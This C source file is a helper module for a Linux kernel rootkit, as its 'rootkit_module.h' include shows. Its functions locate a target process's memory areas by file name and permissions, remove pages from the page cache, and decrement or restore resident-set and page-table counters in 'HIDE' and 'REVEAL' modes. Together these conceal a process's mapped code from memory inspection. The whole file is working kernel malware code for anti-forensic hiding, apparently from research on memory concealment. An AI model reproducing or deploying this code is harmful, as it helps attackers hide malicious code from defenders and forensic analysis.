/* helper.c -- general helper functions
 *
 * Copyright (C) 2019 Patrick Reichenberger
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA
 */
#include <linux/module.h>
#include <linux/pagemap.h>

#include "helper.h"
#include "rootkit_module.h"
#include "debug.h"


/** find_mm - determines the memory descriptor of task
 *  @pid: ID
 *
 * NOTE: This function is based on code from Carter Yagemann:
 * https://carteryagemann.com/pid-to-cr3.html
 */
struct mm_struct *find_mm(int pid) {
    struct task_struct *task = pid_task(find_vpid(pid), PIDTYPE_PID);
    struct mm_struct *mm;

    if (task == NULL) {
        return 0;
    }
    /* These checks are done defensively, because on closing the application, the VMAs are deleted
     * which can cause null pointer dereferences. */
    if (task->mm == NULL) {
        if(task->active_mm == NULL) {
            return 0; // pid has also no mm and no active_mm
        } else {
            mm = task->active_mm;
        }
    } else {
        mm = task->mm;
    }
    return mm;
}

/* Determines memory descriptor and returns mmap (begin of VMA list) */
struct vm_area_struct *find_vma_mmap(int pid) {
    struct mm_struct *mm = find_mm(pid);
    if(mm) {
        return mm->mmap;
    } else {
        return 0;
    }
}

/** find_vma_path_rights - searches VMA with specified path and rights for PID
 *  @path: path of the VMA
 *  @rights: rights of the VMA
 *  @pid: PID
 *
 *  Traverses the linked list of VMAs and returns pointer to vm_area_struct if path and rights match
 */
struct vm_area_struct *find_vma_path_rights(const char *path, int rights, int pid) {
    struct mm_struct *mm = find_mm(pid);

    /* Problems occur in this function sometimes, if the process is terminated while the data is hidden in automatic mode. */
    if(down_read_trylock(&mm->mmap_sem)) {
        struct vm_area_struct *vma = find_vma_mmap(pid);
        while (vma) {
            if(vma->vm_file && vma->vm_file->f_path.dentry && !strcmp(vma->vm_file->f_path.dentry->d_name.name, path)
                && vma->vm_flags && ((vma->vm_flags & (VM_READ | VM_WRITE | VM_EXEC)) == rights)) {
                up_read(&mm->mmap_sem);
                return vma;
            }
            vma = vma->vm_next;
        }
        up_read(&mm->mmap_sem);
    }
    return 0;
}

/** own_delete_from_page_cache - deletes a page from the page cache
 *  @pte: PTE mapping the page to delete
 *
 *  Own function that deletes from the page frame, as there are some conditions required so that no errors are thrown.
 *  1. The page must be locked
 *  2. The page must be unmapped (_mapcount is -1)
 *  3. The page must not be dirty
 *  4. The page must be in the page cache
 */
struct page *own_delete_from_page_cache(PTE *pte) {
    struct page *page;
    /* Obtains a pointer to the struct page. */
    page = get_pte_page(pte);

    /* Locks the page */
    __SetPageLocked(page);

    /* Stores the original value */
    int orig_mapcount = (page->_mapcount).counter;
    /* Sets the counter of the page frame to -1 in order to be able to be deleted */
    (page->_mapcount).counter = -1;

    /* Clear the dirty flag in order to avoid the warning that would be triggered by
     * unaccount_page_cache_page which is called from delete_from_page_cache */
    ClearPageDirty(page);

    /* Get the address space of the page */
    struct address_space *mapping = page_mapping(page);

    if(mapping && !((unsigned long) mapping & 0x1)) {
        /* Check if page in page cache */
        struct page *page_in_cache = find_get_page(mapping, page->index);
        if(page_in_cache) {
            log_print(LOG_INFO, "Delete page with PFN %#016llx from page cache.", pte->value);
            /* Delete from page cache */
            delete_from_page_cache(page);
        }
    }
    /* To prevent the original page frame to be reclaimed, set the counter to original value */
    (page->_mapcount).counter = orig_mapcount;

    /* Clear the lock flag */
    __ClearPageLocked(page);
    return page;
}

/** modify_rss_stat_count - adjust the resident set size (RSS) counter
 *  @mm: memory descriptor of rss
 *  @vm_flags: rights of VMA
 *  @swap: is page swapped out
 *  @mode: hide or reveal
 *
 *  Modifies the RSS counter depending on the type of the VMA and thus the pages.
 *  The pages in the executable VMA belong to the shared memory pages when loaded via memory file.
 *  Pages in read-only and writable data VMAs belong to anonymous pages, as they are modified in memory.
 */
void modify_rss_stat_count(struct mm_struct *mm, int vm_flags, int swap, int mode) {
    int rights = vm_flags & (VM_READ | VM_WRITE | VM_EXEC);

    if( rights == (VM_READ | VM_EXEC)) {
        if(!swap) {
            /* Executable is in shared memory region for library mapped from memory file descriptor.
             * Only decreased/increased when it is in memory */
            if(mode == HIDE) {
                atomic_long_dec(&mm->rss_stat.count[MM_SHMEMPAGES]);
            } else if(mode == REVEAL) {
                atomic_long_inc(&mm->rss_stat.count[MM_SHMEMPAGES]);
            }
        }
    } else if(rights == VM_READ || rights == (VM_READ | VM_WRITE)) {
        if(!swap) {
            /* If page present, writeable and readonly belong to anonymous mapped counter */
            if(mode == HIDE) {
                atomic_long_dec(&mm->rss_stat.count[MM_ANONPAGES]);
            } else if(mode == REVEAL) {
                atomic_long_inc(&mm->rss_stat.count[MM_ANONPAGES]);
            }
        } else {
            /* If page not present it is swapped */
            if(mode == HIDE) {
                atomic_long_dec(&mm->rss_stat.count[MM_SWAPENTS]);
            } else if(mode == REVEAL) {
                atomic_long_inc(&mm->rss_stat.count[MM_SWAPENTS]);
            }
        }
    }
}


/** modify_rss_stat_countpteremap - adjust the resident set size (RSS) counter for PTE remapping technique
 *  @mm: memory descriptor of rss
 *  @rights: rights of VMA
 *  @mode: hide or reveal
 *
 *  When remapping the PTEs, only the RSS counter for the pages in the executable VMA needs to be adjusted
 *  as nothing is deleted.
 *  The point is that usually file mapped library pages belong to the type of file pages and not to shared memory
 *  pages. Hence, the counter for these are adapted.
 */
void modify_rss_stat_countpteremap(struct mm_struct *mm, int rights, int mode) {
    if((rights & (VM_READ | VM_WRITE | VM_EXEC)) == (VM_READ | VM_EXEC)) {
        if(mode == HIDE) {
            atomic_long_dec(&mm->rss_stat.count[MM_SHMEMPAGES]);
            atomic_long_inc(&mm->rss_stat.count[MM_FILEPAGES]);
        } else if(mode == REVEAL) {
            atomic_long_inc(&mm->rss_stat.count[MM_SHMEMPAGES]);
            atomic_long_dec(&mm->rss_stat.count[MM_FILEPAGES]);
        }
    }
}


/** adjust_nr_ptes - determines the nr_ptes used by a VMA
 *  @vma: VMA
 *  @last_included: the last included page to avoid double counts
 *
 *  The number of pages used for storing the PTEs of a VMA are determined.
 *  The last_included parameter is to avoid double counts if two VMAs store PTEs in the same page.
 *  This function is intended to be executed when the list of VMAs is traversed.
 */
struct nr_ptes_vma_track adjust_nr_ptes(struct vm_area_struct *vma, unsigned long last_included) {
    struct nr_ptes_vma_track nrPtesTracker;
    int nr_ptes = 0;
    int rights = vma->vm_flags & (VM_READ | VM_WRITE | VM_EXEC);

    if( rights == (VM_READ | VM_EXEC) ) {
        /* If the start address of the first VMA begins in an own PT without other parts,
         * there is for sure one PT. */
        if ((vma->vm_start & PMD_PAGE_MASK) != (vma->vm_prev->vm_end & PMD_PAGE_MASK)) {
            nr_ptes++;
        }
        /* It is increased for every additional PT in this area */
        nr_ptes += ((vma->vm_end - vma->vm_start) & PMD_PAGE_MASK) >> PMD_SHIFT;
        /* Tracks the last PT included */
        last_included = (vma->vm_end & PMD_PAGE_MASK);
    } else if(rights) {
        /* For the r/w and ro VMAs, it is checked, whether the start address of the VMA is included in
         * the last PT already counted */
        if(((vma->vm_start & PMD_PAGE_MASK) != last_included)) {
            nr_ptes++;
        }
        /* It is increased for every additional PT in this area */
        nr_ptes += ((vma->vm_end - vma->vm_start) & PMD_PAGE_MASK) >> PMD_SHIFT;
        last_included = (vma->vm_end & PMD_PAGE_MASK);

        if(rights == (VM_READ | VM_WRITE)) {
            /* If the last PT also contains PTEs of another not to be hidden VMA, it is decreased */
            if ((vma->vm_end  & PMD_PAGE_MASK) == (vma->vm_next->vm_start & PMD_PAGE_MASK)) {
                nr_ptes--;
            }
        }
    }
    nrPtesTracker.nr_ptes = nr_ptes;
    nrPtesTracker.last_included = last_included;
    return nrPtesTracker;
}


/** get_section_address - determine address of module section
 *  @sec_name: name of the section
 *
 *  Determines the address in memory of a section of this module.
 */
unsigned long get_section_address(char *sec_name) {
    /* Get the loaded sections of module and their addresses */
    /* Could also be determined from the ELF header */
    struct module_sect_attr {
        struct module_attribute mattr;
        char *name;
        unsigned long address;
    };

    struct module_sect_attrs {
        struct attribute_group grp;
        unsigned int nsections;
        struct module_sect_attr attrs[0];
    };

    struct module_sect_attrs *mod_sec = (struct module_sect_attrs *) THIS_MODULE->sect_attrs;
    struct module_sect_attr *sec_attr = &mod_sec->attrs[0];
    int j = 0;

    while(j < mod_sec->nsections) {
        if(!strcmp(sec_attr->name, sec_name)) {
            return sec_attr->address;
        }
        sec_attr++;
        j++;
    }

    return 0;
}